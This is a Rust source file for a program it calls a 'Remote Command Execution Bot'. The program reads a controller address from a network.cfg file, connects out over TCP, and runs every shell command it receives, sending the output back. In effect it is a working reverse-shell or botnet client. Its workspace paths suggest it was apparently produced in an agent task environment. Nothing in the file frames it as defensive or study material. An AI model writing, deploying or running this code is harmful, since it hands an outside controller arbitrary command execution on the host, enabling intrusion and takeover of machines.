mod executor;

use std::io::{Read, Write};
use std::net::TcpStream;
use std::fs;
use std::path::Path;

/// Configuration structure for the bot
struct BotConfig {
    host_address: String,
}

impl BotConfig {
    /// Load configuration from network.cfg file
    fn load(config_path: &str) -> Result<Self, Box<dyn std::error::Error>> {
        let content = fs::read_to_string(config_path)?;

        let host_address = content
            .lines()
            .find(|line| line.starts_with("host_address="))
            .and_then(|line| line.split('=').nth(1))
            .map(|s| s.trim().to_string())
            .ok_or("host_address not found in config")?;

        Ok(BotConfig { host_address })
    }
}

/// Main bot structure
struct Bot {
    config: BotConfig,
}

impl Bot {
    /// Create a new bot instance
    fn new(config: BotConfig) -> Self {
        Bot { config }
    }

    /// Connect to the remote controller and start the command loop
    fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("[Bot] Connecting to remote controller at {}", self.config.host_address);

        let mut stream = TcpStream::connect(&self.config.host_address)?;
        println!("[Bot] Connected successfully!");

        // Send initial handshake
        stream.write_all(b"BOT_READY\n")?;

        // Main command loop
        self.command_loop(&mut stream)?;

        Ok(())
    }

    /// Main loop: read commands, execute them, and return results
    fn command_loop(&self, stream: &mut TcpStream) -> Result<(), Box<dyn std::error::Error>> {
        let mut buffer = [0; 4096];

        loop {
            // Read command from remote controller
            let n = stream.read(&mut buffer)?;

            if n == 0 {
                println!("[Bot] Connection closed by remote controller");
                break;
            }

            let command_str = String::from_utf8_lossy(&buffer[..n]);
            let command = command_str.trim();

            println!("[Bot] Received command: {}", command);

            // Handle special commands
            match command {
                "EXIT" | "QUIT" => {
                    println!("[Bot] Received exit command, shutting down");
                    stream.write_all(b"BOT_SHUTDOWN\n")?;
                    break;
                }
                "PING" => {
                    println!("[Bot] Received ping");
                    stream.write_all(b"PONG\n")?;
                }
                _ => {
                    // Execute the command
                    let result = self.execute_and_return(command);
                    stream.write_all(result.as_bytes())?;
                    stream.write_all(b"\n")?;
                }
            }
        }

        Ok(())
    }

    /// Execute a command and format the result for transmission
    fn execute_and_return(&self, command: &str) -> String {
        println!("[Bot] Executing: {}", command);

        match executor::execute_shell_command(command) {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let status = output.status.code().unwrap_or(-1);

                if output.status.success() {
                    format!("SUCCESS|{}", stdout.trim())
                } else {
                    format!("ERROR|Status: {}|{}", status, stderr.trim())
                }
            }
            Err(e) => {
                format!("FAILED|{}", e)
            }
        }
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("=== Remote Command Execution Bot ===");

    // Determine config path - support both /workspace and /tmp/mcp-workspace paths
    let config_paths = vec![
        "/workspace/config/network.cfg",
        "/tmp/mcp-workspace/workspace/config/network.cfg",
    ];

    let config_path = config_paths
        .iter()
        .find(|p| Path::new(p).exists())
        .ok_or("Configuration file not found")?;

    println!("[Bot] Loading configuration from: {}", config_path);

    // Load configuration
    let config = BotConfig::load(config_path)?;
    println!("[Bot] Configuration loaded: host_address = {}", config.host_address);

    // Create and run bot
    let bot = Bot::new(config);
    bot.run()?;

    println!("[Bot] Bot shutdown complete");
    Ok(())
}

